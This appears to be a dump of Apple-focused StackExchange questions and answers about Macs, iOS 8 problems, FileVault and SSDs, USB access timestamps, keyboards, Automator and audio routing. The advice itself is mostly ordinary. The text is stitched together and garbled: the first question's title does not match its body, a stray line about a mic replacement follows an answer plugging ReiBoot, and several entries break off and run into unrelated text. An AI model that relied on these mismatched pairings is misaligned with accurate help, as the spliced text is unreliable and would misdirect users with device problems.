speaking.\n", "Q: Can't mount Macintosh HD volume - journal issue My MacBook Pro (Mavericks) keeps booting into OS X Startup Utility.

I didn't have much time to work with it as my main machine, but today I had more free time so I did and noticed that after a few hours of work it really gets warm on the bottom and fans don't go on higher RPM to cool it down. (It's almost impossible to hear the fans working without pushing my ears against the back of it)\nWanted to ask people who own this laptop or similar models that is this normal? Is your macbook almost quiet all day?\nI installed the smFanControll app and it shows the temperature between 50-55 and fan speed at ~2600RPM, is this normal temperature and fan speed?\n\nA: Yes, this perfectly normal behaviour, 55 is a very reasonable temperature as well. If you start using your device more heavily, like encoding video, playing games, or installing certain software, you should start to notice the fans picking up. \n", "Q: Apple App Store submission review time vs update time I've released an app to the App Store, it's been waiting for review for about 9 days.\nUpon running my own dev version I've realised I'd left a critical part out. Would it be worth waiting for release and then pushing an update or remove it and resubmit?\nWill the update be processed faster than a resubmission?\n\nA: Updates are generally processed faster than the first submission of an app for review, but not drastically faster. It's usually around a day shorter (5 days) compared with the average 6 or 7 days for a first submission.\nNote that iOS 8 has caused an increase in submissions and a consequential increase in review times; Apple may be prioritising updates more to make apps compatible with iOS 8.\n\nA: Check out this resource http://appreviewtimes.com/ . Very handy but it doesn't distinguish between first submissions and updates unfortunately.\n\nA: If you check Apple's developer site they list the percent of new and updates approved in 5 business days or less. I'm not sure how accurate this is because in my experience it usually takes 7-10 days to get either a new app or update approved and far longer if you get rejected.\nApple's review claims link: https://developer.apple.com/support/appstore/app-review/\nActual times from statistical sample: http://appreviewtimes.com/\nBetween the two there is a big discrepancy, or I am just really unlucky as it takes about 10 days (7 business days or so) for me to get updates through for You Doodle.\n", "Q: How Does FileVault 2 Full Disk Encryption Affect SSD Garbage Collection I'm trying to learn how full disk encryption using Filevault 2 will impact SSD garbage collection.  My understanding is that garbage collection involves moving pages in blocks with free space to empty locations on the drive.  However, if Filevault 2 encrypts the entire drive, will the SSD recognize free space as free?  And if not, won't that dramatically increase write amplification and decrease the life of the SSD?\nI've found a lot of posts on FileVault 2 and TRIM (consensus is it works) and FileVault 2 and SSD performance (consensus is so long as your SSD doesn't have a Sandforce controller - which uses compression - the performance impact is minor), but I'm having less luck learning about how FileVault 2 and garbage collection.\n\nA: First off, SSD garbage collection and Trim are very different animals. Garbage collection is based on moving existing data, deleting stale data and creating empty blocks in which to write new data. The drive's understanding of the data is nothing more or less than data is there or it isn't. There is no concept of a file system in an SSD's controller. All writes are done at the block level rather than the page level and a block must be erased before it can be written. A drive's garbage collector knows nothing whatsoever about FileVault.\nIn basic garbage collection without Trim, when the OS deletes the file, it doesn't actually say anything to the controller about the data being stale and available for deletion. The OS merely tracks the address space. The drive will understand that the data is stale in that address if/as/when the OS gives the drive a write command for that address.\nSo, where Trim comes in is that when a file is deleted at the OS level, the controller on the drive is immediately given the information that the data at that particular address is stale. That enables the drive to handle its housekeeping as soon as convenient upon deletion. And that reduces write amplification.\nThe improvement of Trim on SSD performance is true even with SandForce. See:\nhttp://forums.macrumors.com/attachment.php?attachmentid=345371&d=1340805193\nThe diagram clearly indicates that there is increased free space for garbage collection with Trim enabled even when using DuraWrite technology.\nThat out of the way, on to the meat of your question about FileVault 2: Because garbage collection occurs in the SSD without any knowledge of file systems, there is no difference to the SSD whether FV has been enabled or not. To the SSD, there is either valid data, stale data or no data at a particular address.\nWhile whole-disk encryption gives the impression that the data is locked inside a suitcase. That isn't the case. FV2 is scrambling the bits being stored in the pages and blocks. The file allocation and structure of the file system itself remains the same whether FV2 is used or not. And this helps explain why a user can continue to use their system even when a disk is being encrypted or decrypted.\nSo, in summary, Trim is an enhancement to garbage collection and should be enabled regardless of the controller in use. FileVault 2 will not cause problems for SSDs and users can expect normal write amplification, performance degradation, etc. over time for FV2-encrypted SSDs versus non-encrypted SSDs of the same make on the same system with equivalent use. FV2 volumes will benefit from the use of Trim just as much as non-FV2 volumes.\nMy system: Early-2008 MacBook4,1; OS X Lion 10.7.5; Crucial M500 960GB SSD; FV2 encrypted; Trim enabled\nUseful links for further reading:\nhttp://blog.macsales.com/11051-to-trim-or-not-to-trim-owc-has-the-answer\nDoes FileVault 2 interfere with TRIM when using an SSD?\nhttps://discussions.apple.com/thread/3202467?tstart=0\nhttps://superuser.com/questions/315803/how-do-i-resize-a-filevault-2-encrypted-partition (not necessarily 100% related, but still interesting and relevant)\n", "Q: iPhone 5 Stuck in Recovery after IOS8 upgrade My wife's iPhone 5 is now stuck in recovery after she tried to do a IOS8 update over the  air.  Of course she has no backup or anything like that, so this was an all or nothing upgrade.  She got to the \"verifying install\" and then it rebooted and put her in recovery mode.  I called apple support and their only suggestion was a complete restore and losing all her data.  Any suggestions on recovering data or possibly getting out of recovery mode?\nBy recovery mode I mean there is an iTunes logo with a charger and an up arrow pointing to the iTunes logo.  I'm assuming this mean plug your device into iTunes.  \n\nA: I had the exact same problem. The one easy solution is ReiBoot. \nIt's no scam and you can easily leave the recovery mode with just one click.

This replacement also fixes your mic.\n", "Q: What would the downside be of excluding \"Saved Application State\" from Time Machine? I've noticed using BackupLoupe that stuff under ~/Library/Saved Application State/ pops up in my Time Machine backups. I can't find that much about this folder online, but one site describes it as \"where the information regarding files that should be re-opened on startup is stored.\" This doesn't sound to me like it needs to be covered by Time Machine backups. Is there a good reason why this folder needs to be backed up?\nThe folder is small, but if it changes frequently then its footprint in Time Machine could be large.\n\nA: There's no reason to backup this directory.\n\n\n*\n\n*The contents changes so frequently that any backup is outdated by the time the backup's finished. This is no exaggeration; simply the act of making a backup will change the contents of this folder.\n\n*If you're relying on an unsaved document being there next time you open an app based on Restore, you're doing something wrong. Providing you save documents, the data in that folder will be saved to the appropriate location in the file anyway.\n\n*The saved application state stores a bunch of useless information anyway. When you're restoring a full Time Machine backup, the lack of cached data makes any app restore a strenuous task and the saved application state won't help.\nAlso, for what it's worth, this directory used to be (and still is on most installations) part of the standard exclusions list for Time Machine backups.\n", "Q: Can't get into my phone after erasing it through iCloud I forgot my restrictions passcode so I looked at some websites and forums who told me to erase my iPhone from iCloud and to backup my iPhone.\nI did this but unfortunately, now my iPhone is in lost mode and has been erased from iCloud and I can't get into my phone. How can I get back into my phone or reset it?\n\nA: You can disable Lost Mode on your device by going to icloud.com/#find, selecting the device and clicking Stop Lost Mode.\n\nA: You will have to restore your phone. It will ask for your apple id and password at some point in the restoration process (activation lock).

I've kept a weather eye on the Google results, poked around trying to find my own solution, upgraded to Yosemite to see if the issue was resolved there, but nothing turned up. So, during the Thanksgiving break I decided to sit down and fix this once and for all.\nLooooong story short, every time you add a new tag (and possibly when you add a tag to a file) it gets popped into the Finder sidebar for easy access. Handy. Thing is, if you get crazy and add a metric ton of tags, none of them are ever removed from the Finder sidebar. They roll off the edge where you can't see them, and are flagged as \"visible if newer items are removed\" but they are all retained in the sidebar items plist. This plist gets massive, and takes a long time to parse any time it must be modified.\nTo make things worse, when you have \"documents and data\" turned on under System Preferences → iCloud, the tag list is synced. This means the hang follows you to every machine where you are signed into iCloud, even on a fresh reload of OS X. Funfunfun.\nThankfully, there is an easy fix. I'll keep the explanation simple for Joe Internet who may be having this problem stumble across this post.\nWhen the Finder is running properly (not beach-balled), right-click on the icon in the Dock and select Go to Folder. In the dialog that appears type ~/Library/Preferences/. That funny little squiggle at the front is just a nice little shortcut that tells the dialog to start in your home folder for the path, rather than the root of the internal drive.\nYou will be presented with a cornucopia of scary looking plists. The one we are after is titled com.apple.sidebarlists.plist. Copy that plist somewhere you can find it later (just in case something goes awry and you have to put it back). Now, delete the the original plist in the Library folder and reboot your machine. After the reboot Finder will have an empty tag sidebar and you can create, delete, and rearrange tags to your hearts content. No hangs. As long as you have iCloud \"Documents and Data\" enabled, this new clean sidebar will also be uploaded to iCloud and clear out the old gigantic one on all your machines.\nIt should be noted that this DOES NOT delete the tags from your files. That information is actually appended to an extended attribute (xattr) of the file itself, rather than being stored in a single plist or database somewhere. Thankfully, the tags on the files themselves aren't what's causing the hang issue, so we can leave them untouched.\nOf course, what you will lose are the list of tags and custom folders you want in the Finder sidebar. Add the folders back the normal way (drag them into the sidebar) and you can select which tags you want by going to the Finder menu → Preferences → Tags and checking the boxes. I've got about a dozen and things are snappy.\nOne other unfortunate loss are the tags' assigned colors. That's strictly stored in the Finder's plist. The tags may appear to retain their color until you add them back to the sidebar, or try to apply a tag to an item, at which point the color vanishes.\nAfter you've added a tag or two back to the sidebar the \"all tags\" item will reappear at the bottom of the list. Click on that and scroll through the list of tags to re-assign their colors. Make sure to re-apply color even to the tags that appear to have retained it, because when that tag is next added to a file or otherwise modified there's a good chance the color will disappear.\nSomething to note if you have a lot of colors applied: adding them all back may cause the hang issue to re-manifest. All those color assignments are stored in the plist, and too many may drag things down. I've only got a few color assignments so I haven't been able to verify this theory.\nThat's it! Congratulations! Tags are now usable on your machine(s) again. Just remember to go into Finder → Preferences → Tags every now and again and clear the checkbox or minus sign from the tags you don't want displayed in the sidebar and things should remain snappy.\n", "Q: iOS 8 download keeps timing out I have the 32 GB iPhone 5s.  I have 19 GB remaining in my iCloud space.\nIt was suggested to use my laptop to download iOS 8.0 and update my phone via iTunes but it keeps telling me the internet connection timed out.\nIs this happening because Apple's update site is overwhelmed, perhaps?\n\nA: Actually, I have been experiencing this, too. And no dice on using the device to update, either. It has to be on Apple's end, though. There are intermittent reports of this timeout all over the country. My guess is to wait 'til the hubbub has subsided and then leech away! Good luck.\n\nA: I've had similar issues downloading IOS updates via my Mac.\nOne thing I found that, surprisingly, seems to work well is to not update via your Mac (or PC) rather download the update on your iPhone (on WiFi of course).\nFor whatever reason these update come down faster and more reliably, at least for me.\nStandard rules apply, be sure you are on WiFi and that your Phone is showing 100% charge before starting the update. And finally back up your iPhone immediately before applying the update.\n", "Q: iMessages between two devices are received by the device sending the message When my husband sends me an iMessage from his iPhone 5c it sends it to him. If I send him a message from my iPhone 5c it send it to me. This has just happened since we updated yesterday.\n\nA: You are using the same Apple ID or the same cellphone number to receive iMessages on both iPhones' iMessage clients. Doing so will lead to you receiving your own sent message, like I am:\n\nHere's a quick fix:\n\n\n*\n\n*Open Settings>Messages.\n\n\n\n\n\n*Tap \"Send & Receive\".\n\n\n\n\n\n*Tap \"Add another Email\".\n\n*Type a diiferent email ID.

There already exists a binary upload with build version '1.0' for train '1.0'\"\n\nApplication Loader also fails with the same error. How can I upload my app?\n\nA: If you have already uploaded a binary and have rejected it and wish to upload to the same version number: \nGo to your plist file and change \"CFBundleVersion\" so if you're uploading version 1.2 change it to 1.2.1 but keep the \"CFBundleShortVersionString\" as 1.2 so you should have \nCFBundleShortVersionString - 1.2\nCFBundleVersion - 1.2.1\nArchive and submit, then in iTunes Connect you will see all the builds you have submitted for the version 1.2\n\nA: You're trying to upload a binary with the same build version as the current uploaded build, version 1.0.

I have a USB flash drive and I believed someone else may have plugged it in their computer and copied some files. \nUsing my Mac, how do I know when was the last time my usb flash drive was plugged in? \n\nA: The best evidence you could get is to inspect the last access time of the files in question, or perhaps the last access time of the top-level directory on the file system.\nBut first, a bit of background.  A USB flash drive would be treated by the computer much like a disk.  The drive (or, more precisely, the main partition within the drive) would be formatted as a filesystem.  Most flash media come formatted out of the box with a VFAT filesystem, which is a lowest-common-denominator solution that works with nearly all devices, including OS X, Windows, Linux, and digital cameras.  The next most likely alternatives to VFAT would be HFS+ (the native file system of OS X, which Windows doesn't support at all) or NTFS (the native file system of Windows, supported by any version of Windows released this century, but which has just read-only support in OS X, and is rarely supported on digital cameras).\nThat background is relevant because different filesystems store the last access time differently.  I'm going to work with the assumption that your USB stick is formatted with VFAT.  This is important because VFAT filesystems only store the  last access date, not the time of day.  That would be the best evidence you could hope to collect, assuming that everything else goes right.\nTo see last access dates in the Finder,\n\n\n*\n\n*Switch to List view (View → as List (⌘2))\n\n*Show the View Options dialog (View → Show View Options (⌘J))\n\n*Select \"Date Last Opened\"\n\n\nAlternatively, instead of using the Finder, you could use the Terminal to run\nstat -x /Volumes/USB-Stick-Name/Path/To/File\n\nto see the Access time of a particular file.\n\nThere are some important caveats, though!\nFirst, the act of plugging in the media on your Mac will cause it to be automatically mounted, thus altering the last access time of the top-level directory (and perhaps destroying even more evidence than that).  A forensic analysis should require precautions such as mounting the media in read-only mode.  Therefore, you would have to suppress the auto-mounting behaviour of OS X, which is not that easy.\nSecond, your suspected coworker / spy could have taken a similar countermeasure of mounting the media read-only, thus leaving no timestamp as evidence.  (There is also no guarantee that the computer that the spy used had its clock set accurately, which would cast doubt on the validity of any timestamp.)\nThe moral of the story is, if you have any sensitive information to be stored on removable media, encrypt it!  The easiest solution would be to use FileVault 2.  Note, however, that such encryption would make the USB stick unreadable on any machine other than a Mac.\n\nA: Mount your USB device ReadOnly\nFor this the easiest way consists in installing Disk Arbitrator\nand configuring it so as to only mount any device as read-only.\n\nThe Disk-Arbitrator menu bar icon should switch to red.\nPlug in your USB device. There is now no risk that you inadvertantly modify any access time on it.\nSearch for access times\nLet's say that your USB device is mounted as suspicious_USB.\nOpen a Terminal or xterm window.\nLet's say that you are sure that you didn't mount your USB device\non any computer since 20 days.\nWithin your command line window, run the following commands:\ncd /Volumes/suspicious_USB\n/usr/bin/sudo find . -atime -21 -exec ls -dluT {} \\;\n\nThis command will display you any file (even hidden ones) that any operating system might have opened within less than 21 days.\nThe output of this command will display you the detailed last access time\nof any read or simply touched file or folder. For example this command will show you that a folder was simply opened. THis command will show you\nthat Spotlight ran on your USB key.\nIf you find anything, you will know when your USB was read.\nLimitation of waranty\nIf our suspected colleague or attackant is as skilled as to read this\ndocument and to understand how to use it, he might have mounted your\nUSB device read-only too.\nHence he would have left it clean of any access time modification.\nIn this case I have absolutely no method to show that some file\nwas read on your USB device :(.\n\nA: *\n\n*Open your Console\n\n*Select system.log\n\n*Type in the following query in the search pane (upper right hand corner): USBMSC\n\n*You will see something like kernel: USBMSC Identifier (then an alphanumeric string indicating the USB bus address)\n\n*The date and time is shown as well. This will let you know the last time(s) a device was connected to a particular USB bus. \n\n\nA: For \"any USB device\" this is certainly not possible, as the standard is for communication.\nFor USB flash drives, you might try checking access dates of the individual files (don't count on it, often not used anyway, and your own check may overwrite the dates if you're not careful), or the presence of files you know neither you not your computer could have put there (like thumbs.db or RECYCLED for Windows, .DS_Store or .Trashes for mac).\n\nThere is little point in having this feature, in a typical consumer product. Even if it were stored in the device's firmware, it would still be dependent on the host computer's clock.\n\nA: Use Belarc Advisor... run it with Admin privileges... when report is finished search for USB Storage Use in past 30 Days... there you can see type of USB and when last used...\n", "Q: Dictionaries on iOS 8 not working I just updated from iOS 7 to iOS 8, and I noticed that the built-in dictionaries, I previously used, aren't working.

The dictionaries I previously used show a blue circle (while all the others show the cloud download icon).\nI tried to download a new dictionary, and I was able to use it. However, that was in another language.\nHow can I enable these dictionaries again?\n\nA: You can re-enable the apple dictionary by following this steps:\n\n\n*\n\n*Tap on the word you want to define to select it and activate the popup.\n\n*Tap on Define to call up the dictionary.\n\n*Tap on Manage.\n\n*Now activate/download the Apple Dictionary or any other dictionaries you want.\n\n*Tap the X button beside any extra dictionaries you want to remove.\n\n\nNow you should have your dictionary enabled again.\n\nA: After updating to 8.0.2, the bug has been fixed!\n:)\n", "Q: Can't delete Exchange server account from 10.9.5 I did a clean install of 10.9 and then imported some old emails and my keychain.   Now my accounts keep showing an old exchange account for contacts from a previous employer.   I cannot delete this account.  Every time I delete it, it pops back.  HELP!\n\nA: The problem is, that your account isn't saved on your iPhone but rather on the server. You have to delete the account on the server, than it shouldn't pop up again.\n\nA: I did discover under /user/username/library/applicationsupport/addressbook there was a numbered folder with exchange files in it.

I rebooted the iPad and router several times. Any suggestions?\n\nA: First I'd recommend you to reset your network settings:\nTap Settings → General → Reset → Reset Network Settings\nIf that doesn't show the new network within 90 seconds of leaving the device scanning for the network, next you might power down the iOS device once after the settings have been reset.\nEnough users have the same problem as you see in the official Apple forum as well as here, so it looks like Apple has changed how things work with iOS 8. a.k.a “where there’s smoke there’s fire”\nSo only \"real\" solution may be to wait for Apple to fix this with an update.\n", "Q: Using A Windows PC To Recover User Data From HFS Drive (dead Macbook) I'm a Windows guy. I've worked with Macs at times over the years as an IT guy, but they were always small parts of my environments and this is a new challenge for me.\nA friend's Macbook is dead. Old, out of warranty for years, \"loved\", etc. Now dead.\nI'm trying to pull the data off of the still-good HDD (150GB SATA drive) and am having trouble finding the actual user data on the drive.\nThe free trial of MacDrive mounted the drive quickly and easily and I've copied all the data from the drive to my working drives (so I'll still be able to access it once the trial expires). However, I cannot find any files that correspond to the data the user said was on her system.\nWhere do I need to look to find the user's files?\nI though they might be in the \\Users directory where there is a Shared folder with a few hundred KB of data, a Username folder that is empty, and a .Username folder which has 50GB of data mostly contained in \\Users.Username\\Username.sparsebundle\\bands in progressive hexadecimal named files (files named 0 to fff) each 8192KB in size. So I'm pretty sure that's not what I'm looking for.\n\nA: If you're seeing 50GB worth of sparse bundle bands, this suggests that the user has implemented FileVault encryption on the volume. To the very best of my knowledge, it is not possible to mount sparse bundles from Windows systems. You'll need a Mac system of equivalent OS version or newer to mount the drive and the user will need to supply the password used to encrypt the data.\nThis should help with mounting sparse bundles externally:\nhttp://support.apple.com/kb/TS1974\n", "Q: Set Chrome to open PDF rather than download them I'm a student and I'm constantly opening up PDFs for homework. I often end up downloading multiple files, after clicking on a link, each time I start working. Is there any way to set Chrome to only open PDFs and not download them?\n\nA: FYI This answer is outdated and no longer relevant:\nGo to chrome://extensions in the address bar, then find and enable Chromium PDF Viewer.\nThis will tell Chrome to use its built-in PDF viewer instead of downloading. After this is enabled, to download PDFs, just press command+S.\n\nA: You will have to teach your Chrome how to Preview PDF's\nFor that you need to install a PDF preview \"add on\" in Chrome.\n\nAutomatically previews pdfs, powerpoint presentations, and other\n  documents in Google Docs Viewer.\n\nOr you can try this :\nYou can normally open PDFs automatically in Chrome by clicking on the file you want to see.\nIf your PDFs are downloading instead of opening automatically in Chrome, Chrome PDF viewer could be turned off. \nOn your computer, open Chrome.\nAt the top right, click More Settings.\nAt the bottom, click Show advanced settings.\nUnder “Privacy”, click Content settings.\nUnder “PDF Documents,\" check the box next to \"Open PDF files in the default PDF viewer application.”\n(Uncheck this box if you want PDFs to open automatically when you click them.)\n\nA: Chrome Settings\nFirst, go to chrome://settings/content/pdfDocuments and check, that the default behavior is set to Open PDFs in Chrome.\nDo you still experience Chrome to download the PDF directly?\nChecking the HTTP's headers\nThe reason may be the HTTP Content-Disposition header. If the site admin/developer set this header to attachment (instead of inline), it tells the browser that the content should be downloaded directly.\nOr maybe the HTTP Content-Type header is not set to application/pdf but instead to application/octet-stream - rendering the browser unable to automatically open the PDF, leaving it only the download option.\nWorkaround\nThere is a Chrome extension which automatically checks those headers and changes them if necessary. Enabling the browser to open those files inline.\n\nA: In Google Chrome go to Settings. Scroll to the bottom of the page and click on the hyperlink for Show Advanced Settings. From there scroll down until you find the \"Download\" section. Uncheck the box where it asks where to save each file before downloading. Close Chrome and reopen. You should now be able to have the PDF open without prompting to save it.\n\nA: Go to Chrome>Settings>Advanced Settings>Content Settings>PDF Documents. \nDeselect the option Open PDF files in the default PDF viewer\n\nA: Go to\nchrome://settings/content/pdfDocuments\n\nand flip the switch.

The TAB key works fine on Pages for my MBP, with Shift-TAB back indenting it. \nIs there a way to get the TAB key on the Wireless Keyboard to work like the software TAB key for iOS?\n\nA: No. Apple would have to add an additional function for the bluetooth-users, which they hadn't until now.

There's currently no way for iOS to detect the language of the message, but you can use multiple keyboards to show predictions in a different language of your choice.\nTo do this, go to Settings > General > Keyboard > Keyboards. This screen shows a list of keyboards set up on the device. You can use the Add New Keyboard... link at the bottom of the screen to add additional keyboards.

I can switch back to the SwiftKey keyboard with the \"globe\" icon, but this is annoying, especially since the two look similar.\nIs there a way I can either make SwiftKey the default, or remove the standard Apple keyboard?\nMy Keyboard settings page looks like this (note that SwiftKey is already at the top, which is how I assumed the default was set, but the default doesn't seem to be sticking):\n\n\nA: Settings>General>Keyboard>Keyboards sets the keyboards you wish to use. The top keyboard in the list is the Default. \"Edit\" will allow you to edit, remove keyboards or move a keyboard to the top of the list.  To get Swiftkey as the default keyboard, move it to the top of the list.  I tried it and it works for me, of course as per below there are instances when Swiftkey wont be the default keyboard.\nHowever, there are instances where your default keyboard will NOT be used, no matter the settings. Examples include when security settings, passwords etc are required, the standard Apple keyboard (now referred to as 'Quicktype') will launch. So do not expect the 3rd party keyboard to function exactly as the built-in one does...there will be places where it refuses to launch, usually due to a security issue.\nAs of Sept 2014, this is a new feature, so it is likely that there are refinements that will happen over time to help make the use of 3rd party keyboards more seamless. \n\nA: Yes, you can swipe in the Keyboard Settings page to delete the default keyboard or tap edit in the top right and delete it that way.\n\nA: There was an update 8.0.2 that was supposed to resolve a bug the keyboard settings however after updating I was still not getting SwiftKey as my default keyboard, even though it was set at the top, what I did was change the order, then went into an app, pulled up something that needed the keyboard, got the default is keyboard, then went back into setting and made SwiftKey my default again and now it's sticking as the default keyboard\n\nA: Just move SwiftKey to the top of the list.\n", "Q: What does the ⌧ button do? I just bought a wired mac keyboard. Where I would expect numlock to be, it has a key with this mysterious symbol on:\n⌧\n(a rectangular box with a cross through it)\nWhat is this button?\n\nA: It's a clear key. In apps which support it, it clears the contents of the selected entry box. For example, in spreadsheet apps, it will clear the contents of the current cell.\n\nA: You can possibly use it to wake up your computer from sleep.\nMaybe you can use it to make the guys with wireless keyboard envy you.

In Unicode, the Clear key is represented by U+2327 ⌧ x in a rectangle box, defined as \"clear key\"\n\n\nA: In general, its function is to clear the selection, much like pressing Delete or Forward Delete, but unlike with the Delete keys, it will not do anything without something already selected. Luckily, in the Finder, it selects the last item alphabetically, rather than \"clearing\" selected files and folders, which could be bad.\nIt functions as a normal Num Lock key when running Windows or Linux on a Mac, either through a VM or natively. This can be frustrating though, because even old Apple USB keyboards that have \"Num Lock\" printed as \"alt\" text on the Clear key don't have an indicator light for that key (though older ADB keyboards did).\nA long time ago, in a Mac OS far far away, I recall occasionally coming across Mac apps that used the Clear key as a regular Num Lock key, including a very old version of Excel. I don't recall seeing any Mac apps use it in this way in recent history, perhaps not since the release of OS X (or the obsolescence of the ADB keyboards).\n\nA: The \"clear\" key is used to clear simultaneously the contents of all selected cells in Microsoft Excel. This allows the user to clear more than one cell at a time, which is what the \"delete\" key is limited to.\nThis function of the \"clear\" key is essential for work with spreadsheets.\n\nA: And if you have a MacBook Pro since the NumLock has disappeared from F6 and it seems there's no alternative you may opt for the freeware KeyRemap4MacBook https://pqrs.org/macosx/keyremap4macbook/\n\nA: It's very important in MakeMusic's Finale music notation program.

Most Apple applications in newer OS X versions, like OS X 10.9, automatically save all changes to all files and documents without your approval, and file versions and revisions are automatically available from within a submenu within the File menu.\nWhere are such revisions saved, filesystem-wise?\nIf one is to exchange such files, how would one ensure that none of the history gets exchanged, too?\nWhat if one did want to exchange the history, is there a way to accomplish that as well?\n\nA: The different versions of the file are stored in a hidden folder named .DocumentRevisions-V100 in the root of the volume. On recent macOS versions, such as Big Sur and Monterey, you'll find it in the root of the Data volume:\n/System/Volumes/Data/.DocumentRevisions-V100\n\nWhen you exchange files by copying them, sending them as attachments through email, AirDropping them, uploading them to a web site, copying to a cloud drive or similar - it is only the actual file itself that is exchanged. That is, it is the most recent version that you're exchanging. So there's really nothing to worry about there - it happens automatically.\nIf you actually want to exchange the history with the file, I'm afraid that's not immediately possible - there's no user interface for copying the files with past versions. You can of course manually open up each past version and save them as separate files.\n\nA: Versions are stored within the same file so a myfile.pages will have all there versions stored within it.\nA version is only stored when you save from the file menu or use cmd- S\nThe version is just a bit of text that details the changes made since the last version so is not a copy of the file at that stage.\nSo if you sent the file to someone else they should get all the previous versions as well.\n", "Q: How can I add shells to the list in Run Shell Script in the Automator?

I also have an updated Ruby in /opt/rubies/ruby-2.1.2/ which I'd like to use for this shell script action.\nWould anyone know how I can add it to the list? I've tried adding it to /etc/shells which didn't work (and seems like a horrible hack). Doing that removed the custom zsh from the list too!\nAlso, when I first pull in the action my current shell (the custom zsh) is automatically selected. If I try to use the drop down and re-select the custom zsh, it selects /bin/bash instead and removes the custom zsh from the list. If, however, I leave the custom zsh select and I save the workflow and restart automator, the custom zsh is missing and there is no shell selected for the action.\nI could use one of the existing shells to call the custom Ruby, but it would obviously be easier to remove a layer of redirection\nAny help with this will be much appreciated.\n\nA: The list of these shells in this action come from this PLIST file --> \"/System/Library/Automator/Run Shell Script.action/Contents/Resources/Shells.plist\"\nEdit this file to add others shells (need administrator's password)\n    <key>/Users/iain/Library/Frameworks/zsh/Programs/zsh</key>\n<dict>\n    <key>args</key>\n    <array>\n        <string>-c</string>\n        <string>%</string>\n        <string>-</string>\n    </array>\n    <key>script</key>\n    <array>\n        <string>cat</string>\n        <string>for f in \"$@\"&#10;do&#10;&#09;echo \"$f\"&#10;done</string>\n    </array>\n</dict>\n<key>/opt/rubies/ruby-2.1.2/</key>\n<dict>\n    <key>args</key>\n    <array>\n        <string>-e</string>\n        <string>%</string>\n        <string>--</string>\n    </array>\n    <key>script</key>\n    <array>\n        <string>ARGF.each do |f|&#10;&#09;puts f&#10;end</string>\n        <string>ARGV.each do |f|&#10;&#09;puts f&#10;end</string>\n    </array>\n</dict>\n\n", "Q: A few applications are automatically opened when I first turn on the mac I have a few applications that are automatically opened when I start the computer, for example TextWrangler or Activity Monitor.

I also have an iPhone 5 that had iOS 7.1, but I recently updated it to iOS 8.\nWhen I had iOS 7, I used to be able to connect via Wi-Fi and drag music from my Mac to my iPhone. All I had to do was let both of them automatically connect to my home Wi-Fi and drag the songs to my phone, which was listed in the \"Devices\" section of the sidebar in iTunes.\nBut now, I don't see my phone in the sidebar. I can still transfer the songs via USB, but I can't do it via Wi-Fi.\nDoes anyone know why this is happening or what can be done about it?\nI clicked \"Sync Now\" in the \"iTunes Wi-Fi Sync\" section in the Settings app on my iPhone, and it looked like it did something, but I don't see the iPhone in the iTunes sidebar. I looked at \"Devices\" in the file menu in iTunes and I don't see my iPhone there like I used to.\nEDIT: I just noticed that Home Sharing is not working. It is enabled in iTunes, but on my iPhone, I don't see the \"Libraries\" choice in the \"More\" section in the Music app. I tried looking for something that would appear to let me access the music on my laptop from my iPhone, as I have been doing with iOS 7, without any success.\n\nA: You need to have your Iphone connected to a charger before it will be possible to sync over WiFi\nFrom the iOS 8 User Guide:\n\nIf Wi-Fi syncing is turned on, iPhone syncs when it’s connected to a power source, both iPhone and your computer are on and connected to the same wireless network, and iTunes is open on your computer.\n\nEDIT: Update to iOS 8.0.1 and it is working again without connected to a power source.\n\nA: I rebooted my iPhone by simultaneously holding down the home button and the power button for about 5 seconds, then waiting for it to restart.

One of the users decided to change the permissions on the folder and was doing some \"spring cleaning\" now all of my shares are not visible from the workstations except one \"Home Folders\"  This is the only share that has staff(primary group) where as the others and new shares have \"administrators (primary group)\".  How can I change this as the users that are not administrators cannot see any other shares when browsing to the server.\n\nA: If it's the group ownerships, from the command line you could do:\nchown -R yourusername:staff /Path/To/SharedFolder\n\nfor each of the shares, if the other non-admin users you mentioned are in the staff group. Otherwise, replace staff with the correct group. It's possible you may not want all the directories underneath the shared directory shared, so you'd have to go in and alter the permissions/ownership for each of them too, or remove the -R and change folders individually.\nSee some examples of chown here and an explanation of the command I've given here.\nI'd also note down what the current ownership and permissions are using ls -l, so that you can change them back if this doesn't work.\n(obviously, replace yourusername with your username, and /Path/To/SharedFolder with the path to the shared folder.

Is it possible to have 2 wireless interfaces and have each interface connect to a different VPN over a MacPro?\nBasically, I have a MacPro with 2 wireless interfaces. I connected to both wireless networks, and would like each network interface to be able to VPN to 2 different VPNs.\nI was wondering if that was even possible.

That figure gets updated for Soundflower. Not sure what that's about.\n• Setting all buffer sizes to 512 to match the above does not fix the problem either.\n• Clicking is present with all audio, consistently, and begins as soon as audio starts. If there is no audio, there is no clicking.\n• In Audio Midi Setup, Soundflower says its audio is of the 32-bit integer variety, while the closest option Built-in Output has is 32-bit float. I don't know enough about digital signal processing to know if that's an issue.\nI am on the Mid-2014 model MBP with OSX 9.4, Soundflower 1.6.6, and AU Lab 2.3.\n\nA: Soundsiphon solved it for me as well. You do not need to buy the pro version, because the capturing of whole system audio (which means no specific application like safari needs to be selected as an audio source) is for free. :-)\nMy setup:\nsoundsiphon as default system audio device:\n\nany Audio player/source on OS Yosemite -> AU Lab 2.2.2 (IN soundsiphon -> Waves GEQ -> OUT FiiO DAC:\n\nSorry for the german screens :-)\n\nA: I fixed the problem permanently. 0 clicks 100% of the time.\nI have macbook air mid 2013, OSX Yosemite\nAU Lab 2.3.1 \nSound syphon \nhttp://staticz.com/soundsiphon/\nSound siphon is a replacement program for soundflowerbed. It does the same job. \ni think its free? the demo is running now but it doesn't seem to tell me days remaining. \nIm going to go spread the word now. \n\nA: It's exactly the same here, periodic clicking, about 3 times a second. Sound like dropouts. I don't think there's anything we can do :/ I've had the exact same setup working flawlessly in previous versions of OX, even Mavericks if I remember correctly. Apple broke it with 10.9.4. And when you look at the date of the public version, 2.2.2... it's from 2012. 2.3 is not public (beta?) and not working either. Obviously it's no priority for Apple. \nOn my system it doesn't click right away though, only after a while. There's a handful of temporary fixes that sometimes work for me: \n\n\n*\n\n*Closing and reopening AU Lab and the application that is playing back the sound\n\n*In AU Lab, under \"Window\" -> \"Show Studio\", then change the input and output channels, \"apply channel changes\", revert to the right channels, apply again.\nThe latter fix used to work all the time, now it doesn't. It's all super random and frustrating. I really need it to work, cause I'm using an acoustics correction plugin. Now I'm fiddling with AU Lab 30 times a day.\nOne final observation: Certain applications are way more likely to start clicking. The most likely one is Safari content, Soundcloud in particular. Disabling Safari cache didn't help though (to be honest I have no idea why it should change anything, I just try everything).\nSystem info: \nMac Mini i5 2011, 16GB Ram, 512GB 840 Evo SSD, OSX 10.9.4, AU Lab 2.3, Soundflower v1.6.6, Motu 